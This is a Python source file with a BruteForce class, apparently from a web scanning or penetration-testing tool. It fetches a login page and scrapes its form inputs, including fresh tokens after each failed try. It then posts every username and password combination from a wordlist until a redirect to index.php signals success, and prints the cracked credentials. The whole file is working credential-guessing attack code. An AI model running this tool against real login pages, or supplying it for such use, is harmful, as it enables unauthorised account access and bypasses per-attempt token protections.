from bs4 import BeautifulSoup
from Utilities.File import File
from timeit import default_timer as timer


class BruteForce(object):

    def __init__(self, url, request):
        self.url = url
        self.request = request

    def startBruteFoce(self):
        # at this stage, we will be focusing on AUTH (login)
        r = self.request.get(self.url)
        start = timer()
        print("Request URL", r.url)
        if("login" in r.url):
            # it means you on login page (in most cases)
            # then get the possible inputs (empty)
            textfile = File()
            textfile = textfile.getPossibleUserPass()

            flag = False
            for i in range(len(textfile)):
                # token expires every failed attempts, if
                # website does not have token, then it does not matter
                r = self.request.close()
                r = self.request.get(self.url)
                
                soup = BeautifulSoup(r.content, "html.parser")
                data = {}
                for x in soup.findAll("input"):
                    data[x.get('name')] = x.get('value')

                # hardcoded for now... terrible style, who cares
                data["username"] = (textfile[i].strip())
                for j in range(len(textfile)):
                    data["password"] = (textfile[j].strip())
                    s = self.request.post(r.url, data)
                    # print(data)
                    # print(s.url)
                    if("index.php" in s.url):
                        print("Successfully cracked it! " + textfile[i].strip() + ":" + textfile[j].strip())
                        flag = True
                        break
                    r = self.request.close()
                    r = self.request.get(self.url)
                    
                    soup = BeautifulSoup(r.content, "html.parser")
                    data = {}
                    for x in soup.findAll("input"):
                        data[x.get('name')] = x.get('value')
                    data["username"] = (textfile[i].strip())

                if(flag):
                    break

        end = timer()
        print("Completed in %.3f ms" % (end - start))

        return 

